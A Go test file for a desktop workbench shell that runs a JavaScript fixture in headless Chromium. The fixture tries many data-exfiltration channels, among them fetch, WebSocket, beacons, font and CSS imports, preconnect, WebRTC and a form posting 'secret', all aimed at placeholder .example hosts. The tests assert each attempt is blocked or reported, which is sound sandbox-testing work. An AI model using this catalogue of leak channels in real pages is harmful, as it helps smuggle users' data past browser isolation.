package workbench

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// Headless Chromium (the engine of WebView2) loads the real front in a frame
// of a stand-in workbench document, with the CDP overrides the Windows shell
// applies, its frame navigation policy (emulated with Fetch interception)
// and its proxy backstop (a counting canary proxy instead of a dead port).
// Run with CAGE_TEST_BROWSER_PATH set; skipped otherwise.

const scienceExfilFixture = `"use strict";
// Exfiltration fixture (design §7.5), served by the fake daemon and run
// through the real front. Every vector names its own host so that a CSP
// report, a proxy request or a DNS lookup can be traced back to it.
const CANARY = "@CANARY@", WORKBENCH = "@WORKBENCH@";
const results = { legit: {}, vectors: {} };
const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const ext = (name, scheme = "http") => scheme + "://" + name + ".example/x";
const outcome = (promise, ms = 2500) => Promise.race([promise.then((v) => "ok:" + v, (e) => "error:" + (e && e.name || e)), wait(ms).then(() => "timeout")]);
const attempt = async (name, fn) => { console.log("vector " + name); try { results.vectors[name] = await outcome(Promise.resolve().then(fn)); } catch (e) { results.vectors[name] = "threw:" + (e && e.name || e); } };
const event = (target, ok, bad) => new Promise((resolve, reject) => { target.addEventListener(ok, () => resolve(ok)); target.addEventListener(bad, () => reject(new Error(bad))); });
const element = (tag, attributes, parent = document.body) => { const node = document.createElement(tag); for (const [k, v] of Object.entries(attributes)) node.setAttribute(k, v); parent.append(node); return node; };
const nonce = document.querySelector("script[nonce]").nonce;

(async () => {
  // What the app needs.
  results.legit.inline = window.inlineRan === true;
  results.legit.unnoncedInlineBlocked = window.unnoncedRan !== true;
  try { results.legit.eval = eval("6 * 7") === 42; } catch { results.legit.eval = false; }
  try {
    const bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 7, 5, 1, 1, 102, 0, 0, 10, 6, 1, 4, 0, 65, 42, 11]);
    const { instance } = await WebAssembly.instantiate(bytes);
    results.legit.wasm = instance.exports.f() === 42;
  } catch { results.legit.wasm = false; }
  results.legit.blobWorker = await new Promise((resolve) => {
    try {
      const worker = new Worker(URL.createObjectURL(new Blob(["postMessage(6 * 7)"], { type: "text/javascript" })));
      worker.onmessage = (e) => resolve(e.data === 42); worker.onerror = () => resolve(false);
    } catch { resolve(false); }
    setTimeout(() => resolve(false), 3000);
  });
  results.legit.webSocket = await new Promise((resolve) => {
    const socket = new WebSocket("ws://" + location.host + "/api/ws");
    socket.onopen = () => socket.send("ping");
    socket.onmessage = (e) => { resolve(e.data === "ping"); socket.close(); };
    socket.onerror = () => resolve(false);
    setTimeout(() => resolve(false), 3000);
  });
  results.legit.eventSource = await new Promise((resolve) => {
    const source = new EventSource("/api/events"); let n = 0;
    source.onmessage = () => { if (++n === 3) { source.close(); resolve(true); } };
    setTimeout(() => { source.close(); resolve(false); }, 3000);
  });
  results.legit.fetchWithGuestValues = await fetch("/api/echo", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ tz: Intl.DateTimeFormat().resolvedOptions().timeZone, date: new Date().toString(), language: navigator.language }) }).then((r) => r.status === 200, () => false);
  results.legit.identity = { tz: Intl.DateTimeFormat().resolvedOptions().timeZone, offset: new Date().getTimezoneOffset(), language: navigator.language, languages: [...navigator.languages], ua: navigator.userAgent, platform: navigator.platform };
  results.legit.noSharedWorker = typeof SharedWorker === "undefined";
  console.log("legit serviceWorker");
  results.legit.serviceWorkerRefused = navigator.serviceWorker ? await Promise.race([navigator.serviceWorker.register("/assets/sw.js").then(() => false, () => true), wait(3000).then(() => "timeout")]) : true;
  console.log("legit audit");
  // The host's time zone in a body is refused by the front's audit.
  results.legit.auditRefusesHostZone = await fetch("/api/echo", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ tz: "America/Los_Angeles" }) }).then((r) => r.status === 403, () => false);

  // Network vectors.
  await attempt("fetch-http", () => fetch(ext("fetch-http")).then((r) => r.status));
  await attempt("fetch-https", () => fetch(ext("fetch-https", "https")).then((r) => r.status));
  await attempt("fetch-no-cors", () => fetch(ext("fetch-nocors"), { mode: "no-cors" }).then((r) => r.type));
  await attempt("fetch-loopback-ip", () => fetch("http://127.0.0.1:" + CANARY + "/fetch", { mode: "no-cors" }).then((r) => r.type));
  await attempt("fetch-loopback-name", () => fetch("http://localhost:" + CANARY + "/fetch", { mode: "no-cors" }).then((r) => r.type));
  await attempt("fetch-workbench", () => fetch(WORKBENCH + "/api/session", { mode: "no-cors", credentials: "include" }).then((r) => r.type));
  await attempt("xhr", () => new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.open("GET", ext("xhr")); x.onload = () => resolve(x.status); x.onerror = () => reject(new Error("xhr")); x.send(); }));
  await attempt("websocket", () => event(new WebSocket("ws://ws.example/"), "open", "error"));
  await attempt("websocket-tls", () => event(new WebSocket("wss://wss.example/"), "open", "error"));
  await attempt("eventsource", () => event(new EventSource(ext("sse")), "open", "error"));
  await attempt("beacon", () => navigator.sendBeacon(ext("beacon"), "x"));
  await attempt("webtransport", () => typeof WebTransport === "function" ? new WebTransport("https://wt.example:443/").ready : "absent");
  await attempt("img", () => { const image = new Image(); const done = event(image, "load", "error"); image.src = ext("img"); return done; });
  await attempt("media", () => { const audio = new Audio(); const done = event(audio, "canplay", "error"); audio.src = ext("media"); return done; });
  await attempt("css-import", () => { const style = element("style", {}, document.head); style.textContent = "@import url('http://import.example/a.css');"; return wait(500).then(() => "inserted"); });
  await attempt("font-face", () => { const style = element("style", {}, document.head); style.textContent = "@font-face { font-family: exfil; src: url('http://font.example/f.woff2'); } .exfil { font-family: exfil; }"; element("span", { class: "exfil" }).textContent = "x"; return document.fonts.load("16px exfil").then((f) => f.length); });
  await attempt("object", () => { element("object", { data: ext("object") }); return wait(300).then(() => "inserted"); });
  await attempt("preload", () => { element("link", { rel: "preload", as: "image", href: ext("preload") }, document.head); return wait(300).then(() => "inserted"); });
  await attempt("prefetch", () => { element("link", { rel: "prefetch", href: ext("prefetch") }, document.head); return wait(300).then(() => "inserted"); });
  await attempt("preconnect", () => { element("link", { rel: "preconnect", href: "http://preconnect.example" }, document.head); return wait(300).then(() => "inserted"); });
  await attempt("dns-prefetch", () => { element("link", { rel: "dns-prefetch", href: "//dnsprefetch.example" }, document.head); return wait(300).then(() => "inserted"); });
  await attempt("speculation-rules", () => { const s = document.createElement("script"); s.type = "speculationrules"; s.nonce = nonce; s.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: ["http://specrules.example/x"] }], prerender: [{ source: "list", urls: ["http://prerender.example/x"] }] }); document.head.append(s); return wait(500).then(() => "inserted"); });
  await attempt("frame-mcp", () => event(element("iframe", { src: "https://pubmed.claudemcpcontent.com/" }), "load", "error"));
  await attempt("frame-sandbox-port", () => event(element("iframe", { src: "http://127.0.0.1:" + CANARY + "/frame" }), "load", "error"));
  await attempt("frame-loopback-name", () => event(element("iframe", { src: "http://localhost:" + CANARY + "/frame" }), "load", "error"));
  // In a child document: a refused form navigation replaces the document.
  await attempt("form-post", () => { const child = element("iframe", { src: "/assets/blank.html" }); return event(child, "load", "error").then(() => { const doc = child.contentDocument; const form = doc.createElement("form"); form.method = "post"; form.action = ext("form"); const input = doc.createElement("input"); input.name = "x"; input.value = "secret"; form.append(input); doc.body.append(form); form.submit(); return wait(500).then(() => "submitted"); }); });
  await attempt("ping", () => { const child = element("iframe", { name: "pingtarget", src: "/assets/blank.html" }); return event(child, "load", "error").then(() => { const a = element("a", { href: "/assets/blank.html?ping", ping: ext("ping"), target: "pingtarget" }); a.click(); return wait(500).then(() => "clicked"); }); });
  await attempt("webrtc", async () => {
    const peer = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:" + CANARY }, { urls: "stun:stun.example:3478" }, { urls: "turn:turn.example:3478", username: "u", credential: "c" }] });
    const candidates = [];
    peer.onicecandidate = (e) => { if (e.candidate) candidates.push(e.candidate.type + "/" + e.candidate.protocol); };
    peer.createDataChannel("x");
    await peer.setLocalDescription(await peer.createOffer());
    await wait(2000);
    peer.close();
    return candidates.join(",") || "none";
  });
  // Navigations: window.open and the top frame are refused by the iframe
  // sandbox; frame navigations by the shell's frame policy.
  await attempt("window-open", () => String(window.open(ext("popup")) === null));
  await attempt("top-navigation", () => { top.location.href = ext("top"); return wait(300).then(() => "set"); });
  await attempt("child-navigation", () => { const child = element("iframe", { src: "/assets/blank.html" }); return event(child, "load", "error").then(() => { child.contentWindow.location.href = ext("nav-child"); return wait(800).then(() => "set"); }); });
  await attempt("meta-refresh", () => { const child = element("iframe", { srcdoc: "<meta http-equiv=refresh content=\"0;url=http://refresh.example/x\">" }); return wait(800).then(() => "inserted"); });
  await wait(1500);
  await fetch("/api/test/results", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(results) });
  location.href = ext("nav-self");
})();
`

const scienceExfilPage = "<!doctype html><html><head><title>Claude Science</title><script nonce=\"%s\">window.inlineRan = true;</script>" +
	"<script>window.unnoncedRan = true;</script><script src=\"/assets/exfil.js\"></script></head><body></body></html>"

type scienceCanary struct {
	listener net.Listener
	udp      net.PacketConn
	port     int
	mu       sync.Mutex
	hits     []string
	packets  atomic.Int32
}

// newScienceCanary counts every TCP connection and UDP datagram on one
// loopback port: anything the frame reaches besides the front.
func newScienceCanary(t *testing.T) *scienceCanary {
	t.Helper()
	listener, err := net.Listen("tcp4", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	canary := &scienceCanary{listener: listener, port: listener.Addr().(*net.TCPAddr).Port}
	if canary.udp, err = net.ListenPacket("udp4", fmt.Sprintf("127.0.0.1:%d", canary.port)); err != nil {
		t.Fatal(err)
	}
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			_ = conn.SetDeadline(time.Now().Add(2 * time.Second))
			line, _ := bufio.NewReader(conn).ReadString('\n')
			canary.mu.Lock()
			canary.hits = append(canary.hits, "connection: "+strings.TrimSpace(line))
			canary.mu.Unlock()
			_, _ = io.WriteString(conn, "HTTP/1.1 204 No Content\r\nConnection: close\r\n\r\n")
			conn.Close()
		}
	}()
	go func() {
		buffer := make([]byte, 2048)
		for {
			if _, _, err := canary.udp.ReadFrom(buffer); err != nil {
				return
			}
			canary.packets.Add(1)
		}
	}()
	t.Cleanup(func() { listener.Close(); canary.udp.Close() })
	return canary
}

func (c *scienceCanary) seen() []string {
	c.mu.Lock()
	defer c.mu.Unlock()
	return append([]string(nil), c.hits...)
}

// newScienceWorkbenchPage stands in for the desktop entry's document: the
// workbench CSP with frame-src narrowed to the front, and the frame
// attributes of the pane.
func newScienceWorkbenchPage(t *testing.T, frameSources string, ticket func() string) (string, *atomic.Int32) {
	t.Helper()
	var other atomic.Int32
	server := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			if r.URL.Path != "/favicon.ico" { // the browser's, for the top document
				other.Add(1)
			}
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws://"+r.Host+scienceTestCheckSources(frameSources)+"; img-src 'self' data: blob:; media-src 'self' blob:; font-src 'self'; object-src 'none'; frame-src "+frameSources+"; base-uri 'none'; form-action 'self'; frame-ancestors 'none'")
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprintf(w, "<!doctype html><title>Super Cage</title><div id=\"pane\"><iframe id=\"science\" src=\"%s\" sandbox=\"%s\" allow=\"clipboard-write\" referrerpolicy=\"no-referrer\" style=\"width:1000px;height:700px\"></iframe></div>", ticket(), scienceFrameSandbox)
	}))
	listener, err := net.Listen("tcp4", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	server.Listener = listener
	server.Start()
	t.Cleanup(server.Close)
	return fmt.Sprintf("http://localhost:%d", listener.Addr().(*net.TCPAddr).Port), &other
}

// newScienceCanaryProxy is the backstop: Chromium sends every non-loopback
// request here. It records the request line and refuses it.
func newScienceCanaryProxy(t *testing.T) (int, func() []string) {
	t.Helper()
	listener, err := net.Listen("tcp4", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	var mu sync.Mutex
	var lines []string
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			go func() {
				defer conn.Close()
				_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
				line, _ := bufio.NewReader(conn).ReadString('\n')
				mu.Lock()
				lines = append(lines, "connection: "+strings.TrimSpace(line))
				mu.Unlock()
				_, _ = io.WriteString(conn, "HTTP/1.1 403 Forbidden\r\nConnection: close\r\nContent-Length: 0\r\n\r\n")
			}()
		}
	}()
	t.Cleanup(func() { listener.Close() })
	return listener.Addr().(*net.TCPAddr).Port, func() []string {
		mu.Lock()
		defer mu.Unlock()
		return append([]string(nil), lines...)
	}
}

func originOf(raw string) string {
	u, err := url.Parse(raw)
	if err != nil || u.Host == "" {
		return ""
	}
	return u.Scheme + "://" + u.Host
}

// emulateFramePolicy is the shell's NavigationStarting/FrameNavigationStarting
// policy: the top document stays on the workbench, frames on the front.
func (b *testBrowser) emulateFramePolicy(t *testing.T, session, workbench, front string) func() []string {
	t.Helper()
	var mu sync.Mutex
	var blocked []string
	b.on(func(message cdpMessage) {
		if message.Method != "Fetch.requestPaused" {
			return
		}
		var paused struct {
			RequestID string `json:"requestId"`
			Request   struct {
				URL string `json:"url"`
			} `json:"request"`
		}
		_ = json.Unmarshal(message.Params, &paused)
		if origin := originOf(paused.Request.URL); origin == workbench || origin == front || scienceLabelHost.MatchString(strings.TrimPrefix(origin, "http://")) {
			_ = b.call(message.SessionID, "Fetch.continueRequest", map[string]any{"requestId": paused.RequestID}, nil)
			return
		}
		mu.Lock()
		blocked = append(blocked, paused.Request.URL)
		mu.Unlock()
		_ = b.call(message.SessionID, "Fetch.failRequest", map[string]any{"requestId": paused.RequestID, "errorReason": "BlockedByClient"}, nil)
	})
	if err := b.call(session, "Fetch.enable", map[string]any{"patterns": []map[string]any{{"urlPattern": "*", "resourceType": "Document", "requestStage": "Request"}}}, nil); err != nil {
		t.Fatal(err)
	}
	return func() []string {
		mu.Lock()
		defer mu.Unlock()
		return append([]string(nil), blocked...)
	}
}

// scienceBackstopArgs are what the shell adds to the WebView2 environment
// while host rendering is on (ScienceFrame.cs), with the dead port replaced
// by the canary proxy.
func scienceBackstopArgs(proxyPort int) []string {
	return []string{fmt.Sprintf("--proxy-server=http://127.0.0.1:%d", proxyPort), "--webrtc-ip-handling-policy=disable_non_proxied_udp", "--disable-shared-workers", "--no-pings"}
}

// pageRequests drops the browser's own background requests (Google time,
// accounts and the like) from the proxy's record: the backstop stops those
// too, but they do not come from the frame. Anything else is the page's.
func pageRequests(lines []string) []string {
	var page []string
	for _, line := range lines {
		fields := strings.Fields(strings.TrimPrefix(line, "connection: "))
		if len(fields) < 2 {
			page = append(page, line)
			continue
		}
		host := fields[1]
		if u, err := url.Parse(host); err == nil && u.Host != "" {
			host = u.Host
		}
		host, _, _ = strings.Cut(host, ":")
		browser := false
		for _, suffix := range []string{".google.com", ".gstatic.com", ".googleapis.com", ".gvt1.com"} {
			if strings.HasSuffix("."+host, suffix) {
				browser = true
			}
		}
		if !browser {
			page = append(page, line)
		}
	}
	return page
}

// scienceRefusedFrames are the frame navigations of the fixture that the
// CSP refuses; the browser still preconnects to them.
var scienceRefusedFrames = map[string]bool{
	"pubmed.claudemcpcontent.com": true, "form.example": true, "nav-child.example": true, "refresh.example": true, "nav-self.example": true,
}

// The host differs from the guest in every respect.
var scienceHostEnv = []string{"TZ=America/Los_Angeles", "LANG=fr_FR.UTF-8", "LC_ALL=fr_FR.UTF-8"}

func TestScienceBrowserExfiltration(t *testing.T) {
	// What the shell applies today, and the same with Chromium's network
	// prediction turned off (the preference that ends the preconnect).
	t.Run("shell backstop", func(t *testing.T) { runScienceExfiltration(t, nil) })
	t.Run("network prediction off", func(t *testing.T) {
		runScienceExfiltration(t, sciencePreferences())
	})
}

func runScienceExfiltration(t *testing.T, preferences map[string]any) {
	env := newTestScienceFront(t)
	canary := newScienceCanary(t)
	proxyPort, proxied := newScienceCanaryProxy(t)
	workbenchOrigin, workbenchOther := newScienceWorkbenchPage(t, scienceTestFrameSources(env), func() string {
		return env.front.issue(scienceTicket{epoch: env.epoch, identity: testScienceIdentity, host: testHostIdentity()})
	})
	env.front.hooks.ancestor = func() string { return workbenchOrigin }
	env.daemon.page = func(nonce string) string { return fmt.Sprintf(scienceExfilPage, nonce) }
	env.daemon.assets["/assets/exfil.js"] = strings.NewReplacer("@CANARY@", fmt.Sprint(canary.port), "@WORKBENCH@", workbenchOrigin).Replace(scienceExfilFixture)
	env.daemon.assets["/assets/blank.html"] = "<!doctype html><title>blank</title>"
	env.daemon.assets["/assets/sw.js"] = "self.onfetch = () => {};"

	browser := launchTestBrowserWithPreferences(t, preferences, scienceHostEnv, append(scienceBackstopArgs(proxyPort), "--lang=fr-FR")...)
	session := browser.page(t)
	shell := newScienceShell(t, browser, session)
	shell.arm()
	blockedNavigations := browser.emulateFramePolicy(t, session, workbenchOrigin, "")
	console := browser.captureConsole(t, session)
	t.Cleanup(func() {
		if t.Failed() {
			var paths []string
			for _, request := range env.daemon.seen() {
				paths = append(paths, request.Method+" "+request.Path)
			}
			state, _ := json.Marshal(env.front.snapshot())
			t.Logf("console:\n%s\ndaemon: %q\nfront: %s", strings.Join(console(), "\n"), paths, state)
		}
	})
	if err := browser.call(session, "Page.navigate", map[string]any{"url": workbenchOrigin + "/"}, nil); err != nil {
		t.Fatal(err)
	}
	var results struct {
		Legit   map[string]any    `json:"legit"`
		Vectors map[string]string `json:"vectors"`
	}
	waitFor(t, 90*time.Second, "the fixture's results", func() bool {
		env.daemon.mu.Lock()
		defer env.daemon.mu.Unlock()
		if len(env.daemon.results) == 0 {
			return false
		}
		return json.Unmarshal(env.daemon.results[0], &results) == nil
	})
	time.Sleep(2 * time.Second) // the last navigation and late CSP reports
	state := env.front.snapshot()
	browser.stop()
	if keep := os.Getenv("CAGE_TEST_NETLOG_COPY"); keep != "" {
		if data, err := os.ReadFile(browser.netLog); err == nil {
			_ = os.WriteFile(keep, data, 0600)
		}
	}
	network, err := readNetLog(browser.netLog)
	if err != nil {
		t.Fatal(err)
	}
	report, _ := json.MarshalIndent(map[string]any{"legit": results.Legit, "vectors": results.Vectors, "violations": state.Violations, "blocked_navigations": blockedNavigations(), "proxy": proxied(), "canary": canary.seen(), "udp": canary.packets.Load(), "network": network, "workbench_other": workbenchOther.Load(), "blocked_count": state.BlockedCount}, "", "  ")
	t.Logf("browser run:\n%s", report)

	for _, need := range []string{"inline", "unnoncedInlineBlocked", "eval", "wasm", "blobWorker", "webSocket", "eventSource", "fetchWithGuestValues", "noSharedWorker", "serviceWorkerRefused", "auditRefusesHostZone"} {
		if results.Legit[need] != true {
			t.Errorf("legitimate need %s failed: %v", need, results.Legit[need])
		}
	}
	// Nothing reaches the network: no name looked up, no TCP connection or
	// UDP datagram to anything but loopback (the browser's own background
	// requests go to the proxy like everything else).
	for _, name := range network.DNS {
		t.Errorf("name looked up: %s", name)
	}
	for _, address := range append(append([]string(nil), network.TCP...), network.UDP...) {
		if !loopbackAddress(address) {
			t.Errorf("connection off the host: %s", address)
		}
	}
	// Everything else ends at the backstop: the page's only proxy traffic is
	// the browser's preconnect for frame navigations the CSP refused (a
	// CONNECT or a bare connection; with the shell's dead port, a refused
	// local connection). No request is ever sent through it.
	for _, line := range pageRequests(proxied()) {
		fields := strings.Fields(strings.TrimPrefix(line, "connection: "))
		if preferences != nil {
			t.Errorf("connection to the backstop with prediction off: %q", line)
			continue
		}
		if len(fields) == 0 {
			continue
		}
		host, _, _ := strings.Cut(fields[1], ":")
		if fields[0] != "CONNECT" || !scienceRefusedFrames[host] {
			t.Errorf("request through the backstop: %s", line)
		}
	}
	// On loopback the same preconnect opens a connection to the refused
	// frame's port and sends nothing. No request, no datagram.
	hits := canary.seen()
	for _, hit := range hits {
		if hit != "connection:" && hit != "connection: " {
			t.Errorf("loopback canary got a request: %q", hit)
		}
	}
	limit := 2 // the two refused loopback frames
	if preferences != nil {
		limit = 0
	}
	if len(hits) > limit || canary.packets.Load() != 0 {
		t.Errorf("loopback canary reached: %q, %d datagrams", hits, canary.packets.Load())
	}
	if workbenchOther.Load() != 0 {
		t.Errorf("the frame reached the workbench origin %d times", workbenchOther.Load())
	}
	// A CSP report for each vector CSP can block.
	reported := map[string]bool{}
	for _, violation := range state.Violations {
		reported[violation.Blocked] = true
	}
	blockable := []string{
		"http://fetch-http.example", "https://fetch-https.example", "http://fetch-nocors.example", "http://xhr.example",
		"ws://ws.example", "wss://wss.example", "http://sse.example", "http://beacon.example", "http://img.example", "http://media.example",
		"http://import.example", "http://font.example", "http://object.example", "http://preload.example", "http://form.example",
		"https://pubmed.claudemcpcontent.com", fmt.Sprintf("http://127.0.0.1:%d", canary.port), fmt.Sprintf("http://localhost:%d", canary.port),
		workbenchOrigin,
	}
	var missing []string
	for _, origin := range blockable {
		if !reported[origin] {
			missing = append(missing, origin)
		}
	}
	sort.Strings(missing)
	if len(missing) != 0 {
		t.Errorf("no CSP report for %q", missing)
	}
	// Navigations the CSP cannot stop: the sandbox or the shell's policy did.
	if results.Vectors["window-open"] != "ok:true" {
		t.Errorf("window.open: %s", results.Vectors["window-open"])
	}
	// Frame navigations are checked against the parent's frame-src: the
	// front's own policy for frames inside the app (reported), the
	// workbench's for the Science frame itself (logged by the browser). The
	// shell's frame policy (emulated) is the layer behind them.
	for _, origin := range []string{"http://nav-child.example", "http://refresh.example"} {
		if !reported[origin] {
			t.Errorf("navigation to %s not refused by the front's frame-src", origin)
		}
	}
	logged := strings.Join(console(), "\n")
	if !strings.Contains(logged, "Framing 'http://nav-self.example/' violates") {
		t.Error("the Science frame's own navigation was not refused by the workbench's frame-src")
	}
	if navigated := blockedNavigations(); len(navigated) != 0 {
		t.Logf("navigations left for the shell's policy: %q", navigated)
	}
	if !strings.Contains(fmt.Sprint(results.Legit["identity"]), "Asia/Tokyo") {
		t.Errorf("the fixture did not see the guest's time zone: %v", results.Legit["identity"])
	}
}

func TestScienceBrowserIdentityProbe(t *testing.T) {
	cases := []struct {
		name     string
		arm      bool
		workers  bool
		backstop bool
		pass     bool
		reason   string
	}{
		{"no overrides", false, false, true, false, "时区"},
		{"frame overrides without workers", true, false, true, false, "后台线程"},
		{"the shell's overrides without the backstop", true, true, false, false, "WebRTC"},
		{"the shell's overrides", true, true, true, true, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			env := newTestScienceFront(t)
			proxyPort, proxied := newScienceCanaryProxy(t)
			workbenchOrigin, _ := newScienceWorkbenchPage(t, scienceTestFrameSources(env), func() string {
				return env.front.issue(scienceTicket{epoch: env.epoch, identity: testScienceIdentity, host: testHostIdentity()})
			})
			env.front.hooks.ancestor = func() string { return workbenchOrigin }
			args := []string{"--lang=fr-FR", "--disable-shared-workers"}
			if tc.backstop {
				args = append(scienceBackstopArgs(proxyPort), "--lang=fr-FR")
			}
			browser := launchTestBrowser(t, scienceHostEnv, args...)
			session := browser.page(t)
			if tc.arm {
				shell := newScienceShell(t, browser, session)
				shell.workers = tc.workers
				shell.arm()
			}
			if err := browser.call(session, "Page.navigate", map[string]any{"url": workbenchOrigin + "/"}, nil); err != nil {
				t.Fatal(err)
			}
			waitFor(t, 30*time.Second, "the probe's verdict", func() bool {
				state := env.front.snapshot()
				return state.Session || state.Refused != ""
			})
			state := env.front.snapshot()
			t.Logf("session=%v refused=%q", state.Session, state.Refused)
			if state.Session != tc.pass || !strings.Contains(state.Refused, tc.reason) {
				t.Fatalf("session %v, want %v (%s)", state.Session, tc.pass, state.Refused)
			}
			if tc.pass {
				waitFor(t, 10*time.Second, "the daemon's document", func() bool {
					for _, request := range env.daemon.seen() {
						if request.Path == "/" && request.Method == "GET" {
							return true
						}
					}
					return false
				})
			}
			for _, request := range env.daemon.seen() {
				if request.Path != "/" || request.Method != "GET" {
					continue
				}
				if !tc.pass {
					t.Error("the daemon was reached without a passing probe")
				}
				if request.UserAgent != testScienceIdentity.UserAgent || request.AcceptLanguage != testScienceIdentity.UpstreamAcceptLanguage {
					t.Errorf("upstream identity: %q %q", request.UserAgent, request.AcceptLanguage)
				}
			}
			if lines := pageRequests(proxied()); len(lines) != 0 {
				t.Errorf("requests reached the backstop proxy: %q", lines)
			}
		})
	}
}

// sciencePreferences is what the shell merges into the WebView's
// Preferences file before it starts with the switches (golden
// "preferences"): no network prediction (DNS prefetch, preconnect).
func sciencePreferences() map[string]any {
	return map[string]any{"net": map[string]any{"network_prediction_options": 2}}
}

// scienceTestCheckSources is what scienceDocumentSources adds to the
// workbench document's connect-src while a front runs.
func scienceTestCheckSources(frameSources string) string {
	if frameSources == "'none'" {
		return ""
	}
	return " " + scienceProxyCheckOrigin
}

// F5: the window's proxy proof holds under the shell's switch only. The
// second case is the negative control without any proxy switch (this host's
// system proxy settings apply); the third, a proxy that answers (the canary).
func TestScienceBrowserProxyCheck(t *testing.T) {
	harness := newScienceFrameHarness(t, scienceFrameSource(17840))
	canary, _ := newScienceCanaryProxy(t)
	for _, tc := range []struct {
		name string
		args []string
		want string
	}{
		{"the shell's switch", scienceBackstopArgs(9), "verified"},
		{"no switch", nil, "failed"},
		{"a proxy that answers", scienceBackstopArgs(canary), "failed"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			browser := launchTestBrowser(t, scienceHostEnv, tc.args...)
			page := browser.page(t)
			shell := newScienceShell(t, browser, page)
			shell.load(t, harness.origin+"/")
			got, detail := shell.proxyCheck(t)
			t.Logf("%s: %s", got, detail)
			if got != tc.want {
				t.Fatalf("proxy check %s, want %s (%s)", got, tc.want, detail)
			}
		})
	}
}
